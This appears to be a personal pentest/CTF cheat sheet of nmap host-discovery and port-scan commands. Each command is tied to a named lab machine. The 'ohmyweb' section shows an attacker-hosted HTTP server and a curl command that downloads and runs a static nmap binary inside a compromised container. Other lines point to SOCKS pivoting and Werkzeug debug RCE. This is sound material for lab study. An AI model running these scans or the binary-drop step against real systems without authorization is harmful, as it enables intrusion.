# nmap

Network scanner used for port discovery, service detection and version fingerprinting. Usually the first step of every engagement to map open ports and running services on the target.

---

## Host Discovery

Any response from a host is an indication that it is online. Use `-sn` to limit the run to host discovery without port scanning.

| Scan Type              | Example Command                              |
|------------------------|----------------------------------------------|
| ARP Scan               | `sudo nmap -PR -sn MACHINE_IP/24`            |
| ICMP Echo Scan         | `sudo nmap -PE -sn MACHINE_IP/24`            |
| ICMP Timestamp Scan    | `sudo nmap -PP -sn MACHINE_IP/24`            |
| ICMP Address Mask Scan | `sudo nmap -PM -sn MACHINE_IP/24`            |
| TCP SYN Ping Scan      | `sudo nmap -PS22,80,443 -sn MACHINE_IP/30`   |
| TCP ACK Ping Scan      | `sudo nmap -PA22,80,443 -sn MACHINE_IP/30`   |
| UDP Ping Scan          | `sudo nmap -PU53,161,162 -sn MACHINE_IP/30`  |

| Option | Purpose                                         |
|--------|-------------------------------------------------|
| `-n`   | No DNS lookup                                   |
| `-R`   | Reverse DNS lookup for all hosts                |
| `-sn`  | Host discovery only (no port scan)              |

---

## Port Scanning

Three core scan types for discovering running TCP and UDP services on a target host.

| Port Scan Type  | Example Command               |
|-----------------|-------------------------------|
| Connect Scan    | `nmap -sT 10.130.164.74`      |
| TCP SYN Scan    | `sudo nmap -sS 10.130.164.74` |
| UDP Scan        | `sudo nmap -sU 10.130.164.74` |

| Option                  | Purpose                              |
|-------------------------|--------------------------------------|
| `-p-`                   | All ports                            |
| `-p1-1023`              | Scan ports 1 to 1023                 |
| `-F`                    | 100 most common ports                |
| `-r`                    | Scan ports in consecutive order      |
| `-T<0-5>`               | T0 slowest, T5 fastest               |
| `--max-rate 50`         | Rate ≤ 50 packets/sec                |
| `--min-rate 15`         | Rate ≥ 15 packets/sec                |
| `--min-parallelism 100` | At least 100 probes in parallel      |

---

## Commands Used

### Kenobi / Internal / Decryptify — Fast all-port discovery before targeted service scans
```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open
nmap -sS -p- --open -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
```
Used on: **Kenobi**, **Internal**, **Decryptify**

---

### Wreath — External Webmin discovery + internal TCP-connect scan through SOCKS
```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
```
Used on: **Wreath**

---

### Vulnerability Capstone — Fast all-port discovery then targeted service scan
```bash
nmap -sS --min-rate 5000 -Pn -n -p- $TARGET -oN silent
nmap -sVC -p22,80 $TARGET -oN service
```
Used on: **Vulnerability Capstone** — found SSH and Apache before Fuel CMS enumeration.

- `-Pn` — skip host discovery and treat the host as online
- `-n` — disable DNS lookups
- `--min-rate 5000` — keep discovery fast on lab targets

---

### Kobold / CCTV / DevArea — Full TCP scan with service/version detection + default scripts
```bash
nmap -sC -sV -p- TARGET_IP
```
Used on: **Kobold**, **CCTV**, **DevArea**

- `-sC` — run default NSE scripts
- `-sV` — detect service versions
- `-p-` — scan all 65535 TCP ports

---

### Overwatch — Targeted scan against specific AD ports (no ping, no DNS)
```bash
nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP
```
Used on: **Overwatch**

- `-sVC` — combined service detection + default scripts
- `-Pn` — skip host discovery (treat as online)
- `-n` — no DNS resolution

---

### Team / IDE — Two-phase: fast stealth discovery → targeted service scan
```bash
# Phase 1 — find open ports quickly (SYN scan, no DNS, high rate)
nmap -sS -p- --min-rate 5000 -n TARGET_IP

# Phase 2 — service/version/script scan on discovered ports only
nmap -sVC -p21,22,80 TARGET_IP -oA service-scan
```
Used on: **Team**, **IDE**

- `-sS` — SYN (stealth) scan
- `--min-rate 5000` — send at least 5000 packets/second
- `-oA` — output to all three formats (`.nmap`, `.gnmap`, `.xml`)

---

### MonitorsFour — Focused HTTP/WinRM check
```
80/tcp    open  http    nginx
5985/tcp  open  http    Microsoft HTTPAPI httpd 2.0
```
Used on: **MonitorsFour**

---

### ohmyweb — Static binary inside a stripped container (no nmap installed)
```bash
# Attacker — host the static binary
cd ~/static-bins && sudo python3 -m http.server 80
# https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

# Inside the container
curl -fsSL http://$LHOST/nmap -o /tmp/nmap && chmod +x /tmp/nmap
/tmp/nmap 172.17.0.1 -p- --min-rate 5000
```
Used on: **ohmyweb** — found OMI/OMIGOD on `5986/tcp`. Static-binary drop pattern: [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md)

---

### Bookstore — Banner-grab specific ports after discovery sweep
```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,80,5000,23636,36497 $TARGET -oA service
# 5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9) <- Werkzeug debug -> werkzeug-debug-rce.md
```
Used on: **Bookstore**
### New TRY batch - fast all-port discovery and targeted service scans
```bash
nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
nmap -sVC -p $TARGET -oN service

nmap -sS -n -Pn --min-rate 5000 -p- --open $TARGET -oN silent
nmap -sVC -p80 $TARGET -oN service

nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p22,8009,8080 $TARGET -oN service

nmap -sS -p- -n -Pn --min-rate 5000 --open --reason $TARGET -oN silent
nmap -sVC -p22,139,445,8080,8082 $TARGET -oN service
```
Used on: **Lookup**, **bsidesgtdav**, **bsidesgtthompson**, **coldvvars** - same two-phase pattern: discover open TCP quickly, then run scripts/version detection only on confirmed ports.
